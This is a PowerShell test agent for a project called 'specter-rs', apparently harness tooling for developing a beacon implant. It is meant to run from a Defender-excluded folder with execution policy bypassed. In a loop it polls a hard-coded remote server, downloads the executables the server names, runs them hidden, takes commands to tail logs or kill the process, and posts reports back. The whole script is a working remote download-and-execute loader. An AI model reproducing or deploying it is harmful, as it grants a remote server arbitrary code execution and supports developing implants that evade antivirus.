# specter-rs test agent (Windows side) - v2.
#
# ONE-TIME setup on the test VM, from the Defender-excluded Dev folder:
#   powershell -ExecutionPolicy Bypass -File .\agent.ps1
#
# v2 changes (long-lived beacons, live log access):
#   - While a payload runs, the agent polls /control every PollSeconds.
#     Controls: {"action": "log", "id": X} -> tail specter.log and post it
#     WITHOUT touching the running beacon; {"action": "stop", "id": X} ->
#     kill the payload, collect diagnostics, post the report, continue.
#   - The main loop long-polls /job?wait=25 (jobs start within seconds
#     of queueing instead of up to PollSeconds later).
#   - Log/report shape unchanged for "run" jobs (specter_log etc.).
#
# ASCII ONLY: PowerShell 5.1 reads a BOM-less file as ANSI, and any
# non-ASCII byte corrupts the parser.

param(
    [string]$Server = "http://100.126.19.5:8888",
    [int]$PollSeconds = 5,
    [int]$LogTail = 1500
)

$ErrorActionPreference = "Continue"
$here = Get-Location
$lastJob = ""

function Post-Report($obj) {
    try {
        $json = $obj | ConvertTo-Json -Depth 4
        $tmp = [IO.Path]::GetTempFileName()
        [IO.File]::WriteAllText($tmp, $json)
        curl.exe -s -X POST --data-binary ("@" + $tmp) ($Server + "/report") | Out-Null
        Remove-Item $tmp -ErrorAction SilentlyContinue
        Write-Host ("[agent] report " + $obj.id + " posted (" + $obj.action + ")")
    } catch { Write-Host ("report failed: " + $_.Exception.Message) }
}

function Read-SpecterLog {
    $logPath = Join-Path $here "specter.log"
    if (Test-Path $logPath) {
        try {
            # The beacon opens the log with FILE_SHARE_READ: readable live.
            $lines = Get-Content -Path $logPath -Tail $LogTail
            return ($lines -join "`n")
        } catch {
            return ("read error: " + $_.Exception.Message)
        }
    }
    return $null
}

Write-Host ("[agent] v2 polling " + $Server + " every " + $PollSeconds + "s (control channel on)")

while ($true) {
    # Long-poll the job queue (up to 25 s held server-side).
    $raw = ""
    try {
        $raw = curl.exe -s --max-time 30 ($Server + "/job?wait=25&last=" + [uri]::EscapeDataString($lastJob))
    } catch { }

    $job = $null
    try { $job = $raw | ConvertFrom-Json } catch { }
    if ($null -eq $job) { Start-Sleep $PollSeconds; continue }
    if ($job.action -ne "run" -or $job.id -eq "" -or $job.id -eq $lastJob) {
        Start-Sleep 1
        continue
    }
    $lastJob = $job.id
    Write-Host ("[agent] job " + $job.id + ": " + $job.name)

    # Download the payload.
    $exe = Join-Path $here $job.name
    curl.exe -s -o $exe $job.blob_url

    # Run it hidden (its specter.log lands next to the working dir).
    $start = Get-Date
    $proc = Start-Process -FilePath $exe -WorkingDirectory $here -WindowStyle Hidden -PassThru

    # Watchdog loop: control channel while the payload runs.
    $deadline = $start.AddMilliseconds([double]$job.timeout_ms)
    $stopped = $false
    while ((Get-Date) -lt $deadline -and -not $proc.HasExited) {
        $craw = ""
        try { $craw = curl.exe -s --max-time 10 ($Server + "/control") } catch { }
        $ctrl = $null
        try { $ctrl = $craw | ConvertFrom-Json } catch { }
        if ($null -ne $ctrl -and $ctrl.action -eq "log") {
            $log = Read-SpecterLog
            Post-Report @{ id = $ctrl.id; action = "log"; alive = (-not $proc.HasExited); specter_log = $log }
        } elseif ($null -ne $ctrl -and $ctrl.action -eq "stop") {
            try { Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue } catch { }
            $stopped = $true
            break
        }
        Start-Sleep $PollSeconds
    }

    # Kill if still alive (normal timeout or an external stop).
    if (-not $proc.HasExited) {
        try { Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue } catch { }
        Start-Sleep 1
    }
    $exitCode = $null
    try { $exitCode = $proc.ExitCode } catch { }

    # Diagnostics: specter.log + last WER crash for this exe.
    $log = Read-SpecterLog
    $wer = ""
    try {
        $wer = Get-WinEvent -LogName Application -MaxEvents 30 -ErrorAction SilentlyContinue |
            Where-Object { $_.Id -eq 1000 -and $_.Message -like ("*" + $job.name + "*") } |
            Select-Object -First 1 | ForEach-Object { $_.Message }
    } catch { }

    Post-Report @{ id = $job.id; action = "run"; name = $job.name; specter_log = $log;
                  alive = $false; wer_time = (Get-Date -Format o); wer = $wer; exit_code = $exitCode }
}
